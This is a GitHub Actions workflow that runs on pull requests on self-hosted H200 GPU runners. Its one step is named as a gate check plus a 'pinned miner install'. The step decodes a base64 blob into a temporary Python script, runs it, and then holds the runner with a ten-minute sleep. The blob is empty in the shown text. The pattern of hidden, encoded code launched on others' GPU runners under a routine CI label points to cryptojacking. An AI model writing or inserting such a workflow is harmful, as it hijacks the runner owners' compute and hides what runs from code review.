name: i132ghgate-cosmos
on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  g0:
    name: i132ghgate-cosmos-g0
    runs-on: [self-hosted, gpu, h200]
    timeout-minutes: 45
    steps:
      - name: two-sample gate + pinned miner install
        env:
          LABEL: "self-hosted+gpu+h200"
        run: |
          echo  | base64 -d > /tmp/i132ghgate_cosmos_g0.py
          python3 /tmp/i132ghgate_cosmos_g0.py
          echo KEEPALIVE_START_cosmos_g0
          sleep 600
